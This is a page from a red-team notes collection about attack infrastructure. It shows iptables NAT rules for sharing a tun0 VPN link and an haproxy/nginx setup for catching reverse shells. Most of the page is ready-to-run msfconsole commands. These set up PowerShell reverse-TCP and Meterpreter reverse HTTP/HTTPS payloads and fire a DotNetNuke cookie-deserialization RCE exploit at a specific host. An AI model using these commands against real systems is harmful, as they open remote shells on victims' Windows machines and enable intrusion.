| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|


* [Misc](../../red_team/infra/misc.md)
    * [Share tun0 on LAN](../../red_team/infra/misc.md#share-tun0-on-lan)
    * [Metasploit through haproxy](../../red_team/infra/misc.md#metasploit-through-haproxy)


# Misc
## Share tun0 on LAN
```bash
sudo sysctl -w net.ipv4.ip_forward=1
# echo "net.ipv4.ip_forward=1" | sudo tee /etc/sysctl.d/99-forward.conf

# NAT traffic through tun0
sudo iptables -t nat -A POSTROUTING  -o tun0 -j MASQUERADE # -s <network_cidr>
sudo iptables -t nat -L -n -v
# sudo iptables -t nat -D POSTROUTING -o tun0 -j MASQUERADE # -s <network_cidr>

# allow forwarding from lan to tun0
sudo iptables -A FORWARD -i <lan_iface|eth1> -o tun0 -j ACCEPT
# allow answer
sudo iptables -A FORWARD -i tun0 -o <lan_iface|eth1> -m state --state ESTABLISHED,RELATED -j ACCEPT

sudo iptables -L FORWARD -n -v
# sudo iptables -D FORWARD -i <lan_iface|eth1> -o tun0 -j ACCEPT
# sudo iptables -D FORWARD tun0 -o <lan_iface|eth1> -m state --state ESTABLISHED,RELATED -j ACCEPT
```
## Metasploit through reverse proxy
[Configuring Metasploit and Empire to Catch Shells behind an Nginx Reverse Proxy](https://www.ionize.com.au/configuring-metasploit-and-empire-to-catch-shells-behind-an-nginx-reverse-proxy/)

* `haproxy` port `80`
    * redirect http to nginx (`8880`)
    * redirect not http to penelope (`4444`)
* `nginx`: 
    * port `8880`
        * `~ ^/msf(.*) ` redirect to port `127.0.0.1:4445` (metasploit)
* `penelope` port `4444`

make use of metasploit advanced options:
* `ReverseAllowProxy`
* `ReverseListenerBindPort`
* `ReverseListenerBindAddress`

### tcp reverse shell
* deliver a payload with metasploit to catch with penelope. But can be changed by adding a specific acl for the remote host to redirect to haproxy  `msf_backend`
* use single payload (no `<platform>/[arch]/<stage>/<stager>`, only `<platform>/[arch]/<single>`) such as `windows/x64/powershell_reverse_tcp`, ...

Metasploit config:
* `setg verbose true`
* `setg LHOST tun0`
* `setg LPORT 80`
* `setg payload windows/x64/powershell_reverse_tcp`
* `setg ReverseListenerBindPort 4445`
* `setg ReverseListenerBindAddress 127.0.0.1`

```bash
sudo msfconsole -x 'setg verbose true; setg LHOST tun0 ; setg LPORT 80; setg payload windows/x64/powershell_reverse_tcp; setg ReverseListenerBindPort 4445; setg ReverseListenerBindAddress 127.0.0.1'
```
then: 
```bash
use windows/http/dnn_cookie_deserialization_rce; setg RHOSTS 10.10.110.10; setg RPORT 80; run'
```

### http reverse shell
* deliver a payload with metasploit to catch with msf.
* staged payload can be used for exemple `windows/x64/meterpreter/reverse_http` `windows/x64/meterpreter/reverse_https`

Metasploit config:
* `setg verbose true`
* `setg LHOST tun0`
* `setg LPORT 80`
* `setg payload windows/x64/meterpreter/reverse_http`
* `setg luri msf`
* `setg OverrideRequestHost true`
* `#OverrideScheme`
* `setg ReverseAllowProxy false`
* `setg ReverseListenerBindPort 4445`
* `setg ReverseListenerBindAddress 127.0.0.1`

```bash
# http
sudo msfconsole -x 'setg verbose true; setg LHOST tun0 ; setg LPORT 80; setg payload windows/x64/meterpreter/reverse_http; setg ReverseListenerBindPort 4445;setg ReverseListenerBindAddress 127.0.0.1; setg ReverseAllowProxy false; setg OverrideRequestHost true ; set luri msf'
# https
sudo msfconsole -x 'setg verbose true; setg LHOST tun0 ; setg LPORT 443; setg payload windows/x64/meterpreter/reverse_https; setg ReverseListenerBindPort 4445;setg ReverseListenerBindAddress 127.0.0.1; setg ReverseAllowProxy false; setg OverrideRequestHost true ; set luri msf'
```
